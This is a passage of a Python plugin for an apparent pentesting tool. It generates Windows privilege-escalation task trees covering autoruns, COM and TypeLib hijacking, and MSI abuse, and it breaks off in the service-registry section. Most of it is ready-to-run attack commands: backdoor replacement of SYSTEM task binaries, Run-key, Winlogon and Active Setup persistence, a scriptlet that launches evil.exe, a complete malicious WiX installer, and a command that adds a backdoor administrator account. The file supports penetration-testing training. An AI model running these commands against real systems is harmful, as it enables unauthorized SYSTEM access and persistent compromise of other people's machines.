"""
Windows Privilege Escalation Extended Plugin

Comprehensive extension covering:
- Autorun binary privilege escalation (WMIC, scheduled tasks, registry Run keys, startup folders)
- COM hijacking (Procmon detection, task scheduler abuse, TypeLib hijacking)
- MSI exploitation (WiX Toolset, MSI Wrapper, AlwaysInstallElevated)
- Service registry abuse (writable registry keys, Performance subkey DLL injection)
- Potato exploits (modern variants: RoguePotato, PrintSpoofer, GodPotato, EfsPotato, etc.)

Source: HackTricks Windows Local Privilege Escalation documentation
Generated by: CrackPot v1.0
"""

from typing import Dict, Any
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WindowsPrivescExtendedPlugin(ServicePlugin):
    """
    Extended Windows privilege escalation plugin covering autorun exploitation,
    COM hijacking, MSI attacks, service registry abuse, and modern Potato exploits.
    """

    @property
    def name(self) -> str:
        return "windows-privesc-extended"

    @property
    def default_ports(self) -> list:
        return []  # Manual trigger only

    @property
    def service_names(self) -> list:
        return ['windows-privesc-extended']  # Manual trigger only

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """
        Manual trigger only - not auto-detected from port scans.
        User must explicitly request extended privilege escalation enumeration.
        """
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """
        Detect Windows privesc extended activation from findings

        Activates on:
        - Low privilege Windows shell (high confidence for privesc techniques)
        - Windows OS detected (moderate confidence)

        Returns:
            int: Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Low privilege shell on Windows
        if finding_type == FindingTypes.LOW_PRIVILEGE_SHELL:
            if any(hint in description for hint in ['windows', 'win', 'cmd', 'powershell']):
                logger.info("Windows privesc extended activating: Low privilege Windows shell")
                return 95

        # High - Standard shell on Windows
        if finding_type == FindingTypes.SHELL_OBTAINED:
            if 'windows' in description:
                return 80

        # Medium - Windows OS detected
        if finding_type == FindingTypes.OS_WINDOWS:
            return 65

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate comprehensive extended privilege escalation task tree.

        Args:
            target: Target hostname/IP
            port: Service port (unused for manual plugin)
            service_info: Additional context (e.g., {'context': 'local'})

        Returns:
            Hierarchical task tree with 5 major categories
        """
        context = service_info.get('context', 'local')

        tasks = {
            'id': f'windows-privesc-extended-{target}',
            'name': f'Windows Privilege Escalation Extended - {target}',
            'type': 'parent',
            'children': []
        }

        # Add all 5 extended privilege escalation categories
        tasks['children'].extend([
            self._get_autorun_privesc_tasks(target, context),
            self._get_com_hijacking_tasks(target, context),
            self._get_msi_exploitation_tasks(target, context),
            self._get_service_registry_abuse_tasks(target, context),
            self._get_potato_extended_tasks(target, context)
        ])

        return tasks

    def _get_autorun_privesc_tasks(self, target: str, context: str) -> Dict[str, Any]:
        """Autorun binary privilege escalation (8 techniques)"""
        return {
            'id': f'autorun-privesc-{target}',
            'name': 'Autorun Binary Privilege Escalation',
            'type': 'parent',
            'children': [
                {
                    'id': f'wmic-startup-enum-{target}',
                    'name': 'WMIC Startup Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': 'wmic startup get caption,command 2>nul',
                        'description': 'Enumerate binaries configured to run at startup via WMIC',
                        'flag_explanations': {
                            'startup': 'Query startup programs',
                            'get caption,command': 'Display name and command line',
                            '2>nul': 'Suppress errors'
                        },
                        'success_indicators': [
                            'List of startup programs displayed',
                            'Command paths visible',
                            'Writable paths found (check with icacls)'
                        ],
                        'failure_indicators': [
                            'Access denied (requires local access)',
                            'WMIC not available (Windows 11 22H2+ deprecated)'
                        ],
                        'next_steps': [
                            'Check each binary path with: icacls "<path>"',
                            'Look for writable directories in startup paths',
                            'Test replacement: if BUILTIN\\Users:(F), you can hijack'
                        ],
                        'alternatives': [
                            'PowerShell: Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl',
                            'Registry: reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'notes': 'WMIC deprecated in Windows 11 22H2+. Use Get-CimInstance alternative.'
                    }
                },
                {
                    'id': f'schtasks-system-enum-{target}',
                    'name': 'Scheduled Tasks (SYSTEM context)',
                    'type': 'command',
                    'metadata': {
                        'command': 'schtasks /query /fo LIST /v 2>nul | findstr /i "Task To Run" | findstr /i "SYSTEM"',
                        'description': 'Find scheduled tasks running as SYSTEM with writable binaries',
                        'flag_explanations': {
                            '/query': 'Query scheduled tasks',
                            '/fo LIST': 'Output in list format (easier parsing)',
                            '/v': 'Verbose output (includes run-as user)',
                            'findstr /i "SYSTEM"': 'Case-insensitive filter for SYSTEM tasks'
                        },
                        'success_indicators': [
                            'Tasks running as NT AUTHORITY\\SYSTEM found',
                            'Task binary paths displayed',
                            'Writable task binaries (check with icacls)'
                        ],
                        'failure_indicators': [
                            'No SYSTEM tasks found',
                            'All task binaries are read-only'
                        ],
                        'next_steps': [
                            'Check task binary permissions: icacls "<task_binary>"',
                            'If writable, replace with backdoor: copy evil.exe "<task_binary>"',
                            'Create malicious task: schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "Backdoor" /TR "C:\\temp\\evil.exe"'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ScheduledTask | where {$_.TaskPath -notlike "\\Microsoft*"} | ft TaskName,TaskPath,State',
                            'Manual: Check C:\\Windows\\System32\\Tasks\\ directory',
                            'GUI: taskschd.msc'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                        'notes': 'Writable SYSTEM task binaries = instant privesc on next trigger'
                    }
                },
                {
                    'id': f'startup-folder-hijack-{target}',
                    'name': 'Startup Folder Hijacking',
                    'type': 'command',
                    'metadata': {
                        'command': 'dir /b "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul & dir /b "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul',
                        'description': 'Check startup folders for writable paths or hijackable binaries',
                        'flag_explanations': {
                            '/b': 'Bare format (filenames only)',
                            '%programdata%': 'C:\\ProgramData (all users startup)',
                            '%appdata%': 'User-specific startup folder',
                            '2>nul': 'Suppress errors'
                        },
                        'success_indicators': [
                            'Startup folder contents listed',
                            'Shortcuts (.lnk) or executables found',
                            'Writable folder permissions (icacls shows (F) or (M))'
                        ],
                        'failure_indicators': [
                            'Folder does not exist',
                            'Access denied',
                            'Empty startup folders'
                        ],
                        'next_steps': [
                            'Check folder permissions: icacls "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
                            'If writable, drop backdoor: copy evil.exe "%programdata%\\...\\Startup\\update.exe"',
                            'Or create malicious .lnk: shortcut to C:\\Windows\\System32\\cmd.exe /c C:\\temp\\evil.exe'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ChildItem "C:\\Users\\All Users\\Start Menu\\Programs\\Startup"',
                            'Registry: Check HKCU/HKLM\\...\\Explorer\\User Shell Folders'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'MANUAL'],
                        'notes': 'Legacy path: C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup'
                    }
                },
                {
                    'id': f'registry-run-keys-{target}',
                    'name': 'Registry Run/RunOnce Keys',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run & reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce & reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'description': 'Enumerate autorun registry keys (common persistence locations)',
                        'flag_explanations': {
                            'HKLM': 'HKEY_LOCAL_MACHINE (all users, requires admin to write)',
                            'HKCU': 'HKEY_CURRENT_USER (current user, writable by user)',
                            'Run': 'Executes on every logon',
                            'RunOnce': 'Executes once on next logon, then deleted'
                        },
                        'success_indicators': [
                            'Registry values displayed',
                            'Binary paths shown',
                            'Writable HKCU keys (always writable by user)',
                            'Writable HKLM keys (rare, but check with AccessChk)'
                        ],
                        'failure_indicators': [
                            'Registry key does not exist (not an error - keys optional)',
                            'Access denied on HKLM (expected for non-admin)'
                        ],
                        'next_steps': [
                            'Add persistence (HKCU): reg add HKCU\\...\\Run /v Backdoor /t REG_SZ /d "C:\\temp\\evil.exe"',
                            'Check Wow6432Node keys (32-bit on 64-bit): HKLM\\Software\\Wow6432Node\\...\\Run',
                            'Check RunOnceEx for DLL loading: HKLM\\...\\RunOnceEx\\0001\\Depend'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ItemProperty -Path "Registry::HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
                            'Manual: regedit → navigate to keys'
                        ],
                        'tags': ['OSCP:HIGH', 'PERSISTENCE', 'ENUM'],
                        'notes': 'HKCU Run keys = user-level persistence without admin. Check all 13+ Run key locations.'
                    }
                },
                {
                    'id': f'winlogon-userinit-shell-{target}',
                    'name': 'Winlogon Userinit/Shell Hijacking',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit & reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell',
                        'description': 'Check Winlogon registry for hijackable Userinit/Shell values',
                        'flag_explanations': {
                            'Winlogon': 'Handles Windows logon process',
                            'Userinit': 'Default: userinit.exe (runs at logon before Explorer)',
                            'Shell': 'Default: explorer.exe (Windows shell)',
                            '/v': 'Query specific value'
                        },
                        'success_indicators': [
                            'Userinit value: C:\\Windows\\system32\\userinit.exe',
                            'Shell value: explorer.exe',
                            'Writable registry keys (AccessChk64.exe)',
                            'Writable binary paths (icacls)'
                        ],
                        'failure_indicators': [
                            'Access denied (requires SYSTEM or admin to write)',
                            'Values already modified (suspicious)'
                        ],
                        'next_steps': [
                            'If writable registry: reg add ... /v Userinit /d "C:\\Windows\\system32\\userinit.exe,C:\\temp\\evil.exe"',
                            'If writable binary: replace userinit.exe or explorer.exe with backdoor',
                            'Persistence triggers on every user logon'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ItemProperty -Path "Registry::HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name Userinit',
                            'Manual: regedit'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'EXPLOIT'],
                        'notes': 'Userinit supports comma-separated list: userinit.exe,evil.exe (both execute)'
                    }
                },
                {
                    'id': f'active-setup-stubpath-{target}',
                    'name': 'Active Setup StubPath (pre-desktop execution)',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query "HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components" /s /v StubPath',
                        'description': 'Active Setup executes BEFORE desktop loads (persistence vector)',
                        'flag_explanations': {
                            'Active Setup': 'Runs before user logon completes (pre-desktop)',
                            'Installed Components': 'Each subkey = component with StubPath command',
                            '/s': 'Search recursively (all subkeys)',
                            'StubPath': 'Command to execute (can be any valid command)'
                        },
                        'success_indicators': [
                            'StubPath values displayed',
                            'Command paths shown',
                            'IsInstalled = 1 (component active)',
                            'Writable StubPath registry keys'
                        ],
                        'failure_indicators': [
                            'No StubPath values found',
                            'IsInstalled = 0 (inactive)'
                        ],
                        'next_steps': [
                            'Create malicious component: reg add HKLM\\SOFTWARE\\...\\{GUID} /v IsInstalled /t REG_DWORD /d 1',
                            'Set StubPath: reg add ... /v StubPath /t REG_SZ /d "C:\\temp\\evil.exe"',
                            'Executes once per user on next logon (before desktop)'
                        ],
                        'alternatives': [
                            'Check HKCU variant: reg query HKCU\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components /s /v StubPath',
                            'Check Wow6432Node (32-bit): HKLM\\SOFTWARE\\Wow6432Node\\...'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'STEALTH'],
                        'notes': 'Active Setup = pre-desktop execution (before Run keys, startup folder). Stealthy persistence.'
                    }
                },
                {
                    'id': f'alternateshell-safemode-{target}',
                    'name': 'AlternateShell (Safe Mode backdoor)',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v AlternateShell',
                        'description': 'Check AlternateShell registry (default: cmd.exe in Safe Mode)',
                        'flag_explanations': {
                            'SafeBoot': 'Safe Mode boot configuration',
                            'AlternateShell': 'Shell to use in Safe Mode (default: cmd.exe)',
                            '/v': 'Query specific value'
                        },
                        'success_indicators': [
                            'AlternateShell value: cmd.exe (default)',
                            'Writable registry key (AccessChk)',
                            'Writable cmd.exe path (icacls C:\\Windows\\system32\\)'
                        ],
                        'failure_indicators': [
                            'Access denied (requires SYSTEM/admin)',
                            'AlternateShell already modified'
                        ],
                        'next_steps': [
                            'If writable registry: reg add ... /v AlternateShell /d "C:\\temp\\evil.exe"',
                            'If writable PATH: place evil cmd.exe earlier in PATH (executes instead of system32 version)',
                            'Configure auto-boot to Safe Mode: bcdedit /set {default} safeboot minimal'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ItemProperty -Path "Registry::HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot" -Name AlternateShell',
                            'Manual: regedit'
                        ],
                        'tags': ['OSCP:LOW', 'PERSISTENCE', 'ADVANCED'],
                        'notes': 'Requires system restart to Safe Mode. Rare in OSCP but good for persistence on unattended systems.'
                    }
                },
                {
                    'id': f'autoruns-comprehensive-{target}',
                    'name': 'SysInternals Autoruns (comprehensive scan)',
                    'type': 'command',
                    'metadata': {
                        'command': 'autorunsc.exe -m -nobanner -a * -ct /accepteula',
                        'description': 'Comprehensive scan of all autorun locations (60+ techniques)',
                        'flag_explanations': {
                            '-m': 'Hide Microsoft-signed entries (focus on 3rd-party)',
                            '-nobanner': 'Suppress banner text',
                            '-a *': 'Scan all autorun types (Run, Services, Drivers, Tasks, etc.)',
                            '-ct': 'Output CSV to stdout (parseable)',
                            '/accepteula': 'Accept EULA (avoid interactive prompt)'
                        },
                        'success_indicators': [
                            'CSV output with autorun entries',
                            'Entry Path column shows file locations',
                            'Publisher column empty = unsigned (suspicious)',
                            'Writable paths found'
                        ],
                        'failure_indicators': [
                            'Autoruns not installed (download from Microsoft)',
                            'No suspicious entries found (all Microsoft-signed)'
                        ],
                        'next_steps': [
                            'Parse output: autorunsc.exe -m -a * -ct | findstr /v "Microsoft"',
                            'Check suspicious unsigned entries with icacls',
                            'Replace writable binaries with backdoors'
                        ],
                        'alternatives': [
                            'Manual enumeration: reg query all Run keys, schtasks, services',
                            'WinPEAS autorun enumeration module',
                            'GUI: Autoruns.exe (interactive analysis)'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED', 'QUICK_WIN'],
                        'notes': 'Download: https://live.sysinternals.com/autorunsc.exe. Most comprehensive autorun scanner.'
                    }
                }
            ]
        }

    def _get_com_hijacking_tasks(self, target: str, context: str) -> Dict[str, Any]:
        """COM hijacking (5 techniques)"""
        return {
            'id': f'com-hijacking-{target}',
            'name': 'COM Hijacking',
            'type': 'parent',
            'children': [
                {
                    'id': f'procmon-com-detect-{target}',
                    'name': 'Procmon: Detect Missing COM Objects',
                    'type': 'command',
                    'metadata': {
                        'command': 'procmon.exe /Quiet /Minimized /BackingFile C:\\temp\\procmon.pml',
                        'description': 'Use Procmon to find missing COM registry keys (RegOpenKey NAME NOT FOUND → InprocServer32)',
                        'flag_explanations': {
                            '/Quiet': 'No prompts or dialogs',
                            '/Minimized': 'Start minimized in system tray',
                            '/BackingFile': 'Log file path (.pml format)'
                        },
                        'success_indicators': [
                            'Procmon running and logging',
                            'Filter: Operation=RegOpenKey, Result=NAME NOT FOUND, Path ends with InprocServer32',
                            'Missing CLSID registry keys identified'
                        ],
                        'failure_indicators': [
                            'Procmon not installed (download from Microsoft)',
                            'Admin rights required to capture kernel events'
                        ],
                        'next_steps': [
                            'Stop Procmon, apply filters: RegOpenKey + NAME NOT FOUND + InprocServer32',
                            'Identify CLSID from path: HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32',
                            'Create hijack: New-Item -Path "HKCU:Software\\Classes\\CLSID\\{CLSID}\\InprocServer32" -Value "C:\\evil.dll"'
                        ],
                        'alternatives': [
                            'Manual: Monitor Application event log for COM errors',
                            'API Monitor: Hook CoCreateInstance calls',
                            'Procmon filters: Save as .pml, load in GUI for analysis'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'notes': 'Download Procmon: https://live.sysinternals.com/procmon.exe. HKCU COM keys writable by user.'
                    }
                },
                {
                    'id': f'com-hijack-create-{target}',
                    'name': 'Create COM Hijack (HKCU writeable)',
                    'type': 'command',
                    'metadata': {
                        'command': 'New-Item -Path "HKCU:Software\\Classes\\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" | Out-Null; New-Item -Path "HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\\beacon.dll" | Out-Null; New-ItemProperty -Path "HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32" -Name "ThreadingModel" -Value "Both"',
                        'description': 'Create HKCU COM hijack (user-writable, no admin needed)',
                        'flag_explanations': {
                            'HKCU:Software\\Classes\\CLSID': 'User-specific COM class IDs (writable by user)',
                            '{CLSID}': 'Replace with missing CLSID from Procmon',
                            'InprocServer32': 'In-process DLL server path',
                            'ThreadingModel': 'Both = support single and multi-threaded apartments',
                            '-Value "C:\\beacon.dll"': 'Path to your malicious DLL'
                        },
                        'success_indicators': [
                            'Registry keys created successfully',
                            'DLL loaded when COM object is instantiated',
                            'DllMain or exported functions execute'
                        ],
                        'failure_indicators': [
                            'CLSID already exists in HKCU (conflict)',
                            'DLL not found at specified path',
                            'DLL architecture mismatch (32-bit vs 64-bit)'
                        ],
                        'next_steps': [
                            'Trigger COM instantiation: open application that uses CLSID',
                            'Monitor DLL load: Process Monitor filter on beacon.dll',
                            'Verify persistence: logoff/logon, DLL loads again'
                        ],
                        'alternatives': [
                            'CMD: reg add HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32 /ve /d "C:\\evil.dll" /f',
                            'Manual: regedit → create keys manually'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PERSISTENCE'],
                        'notes': 'HKCU COM keys = user-level persistence. DLL must export DllMain or DllGetClassObject.'
                    }
                },
                {
                    'id': f'task-scheduler-com-hijack-{target}',
                    'name': 'Task Scheduler COM Hijack (predictable triggers)',
                    'type': 'command',
                    'metadata': {
                        'command': '$Tasks = Get-ScheduledTask; foreach ($Task in $Tasks) { if ($Task.Actions.ClassId -ne $null -and $Task.Triggers.Enabled -eq $true -and $Task.Principal.GroupId -eq "S-1-5-32-545") { Write-Host "Task: $($Task.TaskName) CLSID: $($Task.Actions.ClassId)" } }',
                        'description': 'Find scheduled tasks using COM objects (hijackable, predictable triggers)',
                        'flag_explanations': {
                            'Actions.ClassId': 'COM CLSID used by task action',
                            'Triggers.Enabled': 'Task is active (not disabled)',
                            'Principal.GroupId': 'S-1-5-32-545 = BUILTIN\\Users (non-admin)',
                            '-ne $null': 'Filter tasks with COM actions'
                        },
                        'success_indicators': [
                            'Task names and CLSIDs displayed',
                            'Triggers shown (e.g., LOGON, DAILY, IDLE)',
                            'CLSID missing in HKCU (check: Get-Item HKCU:\\...\\CLSID\\{CLSID})'
                        ],
                        'failure_indicators': [
                            'No COM-based tasks found',
                            'All CLSIDs already exist in HKCU',
                            'Tasks run as SYSTEM (requires admin to hijack)'
                        ],
                        'next_steps': [
                            'Verify CLSID missing in HKCU: Get-Item -Path "HKCU:Software\\Classes\\CLSID\\{CLSID}"',
                            'Create hijack: New-Item HKCU:...\\CLSID\\{CLSID}\\InprocServer32 -Value "C:\\evil.dll"',
                            'Wait for task trigger (e.g., LOGON = next user logon)'
                        ],
                        'alternatives': [
                            'Manual: schtasks /query /fo LIST /v | findstr "ClassId"',
                            'Check existing CLSIDs: Get-ChildItem "Registry::HKCR\\CLSID" | findstr {CLSID}'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PERSISTENCE', 'QUICK_WIN'],
                        'notes': 'Task Scheduler COM = predictable triggers (LOGON, DAILY). Best COM hijack target.'
                    }
                },
                {
                    'id': f'typelib-hijack-script-moniker-{target}',
                    'name': 'TypeLib Hijacking (script: moniker persistence)',
                    'type': 'command',
                    'metadata': {
                        'command': '$clsid="{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}"; $libid=(Get-ItemProperty "Registry::HKCR\\CLSID\\$clsid\\TypeLib")."(default)"; $ver=(Get-ChildItem "Registry::HKCR\\TypeLib\\$libid"|Select -First 1).PSChildName; $dest="C:\\ProgramData\\evil.sct"; New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force|Out-Null; Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name "(default)" -Value "script:$dest"',
                        'description': 'Hijack TypeLib with script: moniker (executes .sct scriptlet on COM load)',
                        'flag_explanations': {
                            'CLSID {EAB22AC0...}': 'Microsoft Web Browser control (frequently loaded)',
                            'TypeLib\\{LIBID}': 'Type library registry key',
                            'script:C:\\...\\evil.sct': 'script: moniker = execute scriptlet',
                            'win32': 'Platform architecture (also check win64 on 64-bit systems)',
                            'HKCU': 'User-writable registry (no admin needed)'
                        },
                        'success_indicators': [
                            'TypeLib registry keys created in HKCU',
                            'script: moniker set as default value',
                            '.sct scriptlet executed when IE/WebBrowser control loads'
                        ],
                        'failure_indicators': [
                            'TypeLib already exists in HKCU',
                            '.sct file not found at specified path',
                            'IE/WebBrowser control not used by target application'
                        ],
                        'next_steps': [
                            'Create .sct scriptlet: <?xml version="1.0"?><scriptlet><script language="JScript">var sh=new ActiveXObject("WScript.Shell");sh.Run("cmd /c C:\\\\evil.exe",0);</script></scriptlet>',
                            'Trigger: Open IE, application with WebBrowser control, or Explorer activity',
                            'Cleanup: Remove-Item -Recurse "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver"'
                        ],
                        'alternatives': [
                            'Other high-frequency CLSIDs: enumerate with Procmon',
                            'Manual: regedit → HKCU\\Software\\Classes\\TypeLib'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'STEALTH', 'ADVANCED'],
                        'notes': 'TypeLib hijack = stealthy persistence. script: moniker executes JScript/VBScript. Source: CICADA8'
                    }
                },
                {
                    'id': f'com-hijack-cleanup-{target}',
                    'name': 'COM Hijack Cleanup (remove persistence)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Remove COM hijack persistence (restore original registry)',
                        'manual_steps': [
                            '1. Identify hijacked CLSID: Get-ChildItem "HKCU:Software\\Classes\\CLSID"',
                            '2. Delete hijacked keys: Remove-Item -Recurse "HKCU:Software\\Classes\\CLSID\\{CLSID}"',
                            '3. Delete TypeLib hijacks: Remove-Item -Recurse "HKCU:Software\\Classes\\TypeLib\\{LIBID}"',
                            '4. Delete malicious DLLs/scriptlets: Remove-Item "C:\\evil.dll", "C:\\evil.sct"',
                            '5. Verify cleanup: Registry keys gone, no DLL loaded in processes'
                        ],
                        'success_indicators': [
                            'Registry keys deleted successfully',
                            'Malicious files removed',
                            'Applications no longer load hijacked COM objects'
                        ],
                        'alternatives': [
                            'CMD: reg delete HKCU\\Software\\Classes\\CLSID\\{CLSID} /f',
                            'Manual: regedit → delete keys'
                        ],
                        'tags': ['OSCP:LOW', 'CLEANUP'],
                        'notes': 'Always clean up persistence after demonstrating exploit for OSCP report.'
                    }
                }
            ]
        }

    def _get_msi_exploitation_tasks(self, target: str, context: str) -> Dict[str, Any]:
        """MSI exploitation (3 techniques)"""
        return {
            'id': f'msi-exploit-{target}',
            'name': 'MSI Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'wix-malicious-msi-{target}',
                    'name': 'WiX Toolset: Create Malicious MSI',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create malicious MSI installer using WiX Toolset (candle.exe, light.exe)',
                        'manual_steps': [
                            '1. Create msi.xml: <?xml version="1.0"?><Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"><Product Id="*" Name="Update" Version="1.0.0" Manufacturer="Microsoft"><Package InstallerVersion="200" Compressed="yes"/><Media Id="1" Cabinet="product.cab" EmbedCab="yes"/><Directory Id="TARGETDIR" Name="SourceDir"><Directory Id="ProgramFilesFolder"><Directory Id="INSTALLLOCATION" Name="Update"><Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"></Component></Directory></Directory></Directory><Feature Id="DefaultFeature" Level="1"><ComponentRef Id="ApplicationFiles"/></Feature><Property Id="cmdline">cmd.exe /C "C:\\\\temp\\\\evil.exe"</Property><CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand=\'[cmdline]\' Return="ignore" Impersonate="yes"/><InstallExecuteSequence><Custom Action="Stage1" After="InstallInitialize"></Custom></InstallExecuteSequence></Product></Wix>',
                            '2. Compile: candle.exe -out C:\\temp\\wix.wixobj C:\\temp\\msi.xml',
                            '3. Link: light.exe -out C:\\temp\\evil.msi C:\\temp\\wix.wixobj',
                            '4. Execute MSI: msiexec /quiet /qn /i C:\\temp\\evil.msi (runs with user privileges)',
                            '5. If AlwaysInstallElevated=1: MSI installs as SYSTEM!'
                        ],
                        'success_indicators': [
                            'wix.wixobj created successfully',
                            'evil.msi installer created',
                            'MSI installs without errors',
                            'CustomAction command executes (evil.exe runs)'
                        ],
                        'failure_indicators': [
                            'WiX Toolset not installed (download from wixtoolset.org)',
                            'XML syntax errors in msi.xml',
                            'MSI installation blocked by Group Policy'
                        ],
                        'alternatives': [
                            'Advanced Installer (commercial)',
                            'Inno Setup (free, but creates .exe installer, not .msi)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'notes': 'Download WiX: https://wixtoolset.org/. CustomAction executes commands during installation.'
                    }
                },
                {
                    'id': f'msi-wrapper-gui-{target}',
                    'name': 'MSI Wrapper: GUI-based MSI Creation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create MSI installer using MSI Wrapper GUI (easier than WiX)',
                        'manual_steps': [
                            '1. Download: https://www.exemsi.com/download/ (free version)',
                            '2. Run MSI Wrapper GUI',
                            '3. Select executable: C:\\temp\\evil.exe (or .bat for command-line execution)',
                            '4. Configure: Set "Run Program" → "Install" → execute on install',
                            '5. Set "User Interface" → "No UI" (silent install)',
                            '6. Set "Elevation" → "Require Administrator" if needed (or leave for user-level)',
                            '7. Build MSI: Click "Build" button',
                            '8. Execute: msiexec /i output.msi'
                        ],
                        'success_indicators': [
                            'MSI file created successfully',
                            'MSI installs and executes payload',
                            'If AlwaysInstallElevated=1: payload runs as SYSTEM'
                        ],
                        'failure_indicators': [
                            'MSI Wrapper not available',
                            'Antivirus blocks MSI creation',
                            'MSI installation fails'
                        ],
                        'alternatives': [
                            'WiX Toolset (XML-based, more control)',
                            'Advanced Installer (commercial, GUI)'
                        ],
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'GUI'],
                        'notes': 'MSI Wrapper = easiest MSI creation. Can wrap .bat files for pure command-line execution.'
                    }
                },
                {
                    'id': f'always-install-elevated-{target}',
                    'name': 'AlwaysInstallElevated Privilege Escalation',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                        'description': 'Check if AlwaysInstallElevated is enabled (MSI installs as SYSTEM)',
                        'flag_explanations': {
                            'HKCU': 'Current user policy',
                            'HKLM': 'Local machine policy (both must be 1 for exploit)',
                            'AlwaysInstallElevated': '1 = MSI packages install with SYSTEM privileges',
                            '/v': 'Query specific value'
                        },
                        'success_indicators': [
                            'HKCU\\...\\AlwaysInstallElevated = 0x1',
                            'HKLM\\...\\AlwaysInstallElevated = 0x1',
                            'Both registry values = 1 (exploit condition met)'
                        ],
                        'failure_indicators': [
                            'Registry key does not exist (feature not enabled)',
                            'AlwaysInstallElevated = 0 (disabled)',
                            'Only one of HKCU/HKLM = 1 (both required)'
                        ],
                        'next_steps': [
                            'Create malicious MSI (see WiX/MSI Wrapper tasks)',
                            'Install MSI: msiexec /quiet /qn /i evil.msi',
                            'MSI CustomAction executes as SYSTEM (instant privesc)',
                            'Add admin user: msiexec /i evil.msi → evil.msi runs: net user backdoor P@ss! /add && net localgroup administrators backdoor /add'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -Name AlwaysInstallElevated',
                            'Manual: regedit → check both HKCU and HKLM keys'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                        'notes': 'AlwaysInstallElevated = instant SYSTEM if both HKCU and HKLM = 1. Rare but fast privesc.'
                    }
                }
            ]
        }

    def _get_service_registry_abuse_tasks(self, target: str, context: str) -> Dict[str, Any]:
        """Service registry abuse (2 techniques)"""
        return {
            'id': f'service-registry-abuse-{target}',
            'name': 'Service Registry Abuse',
            'type': 'parent',
            'children': [
                {
                    'id': f'writable-service-registry-enum-{target}',
                    'name': 'Enumerate Writable Service Registry Keys',
                    'type': 'command',
                    'metadata': {
                        'command': 'accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services',
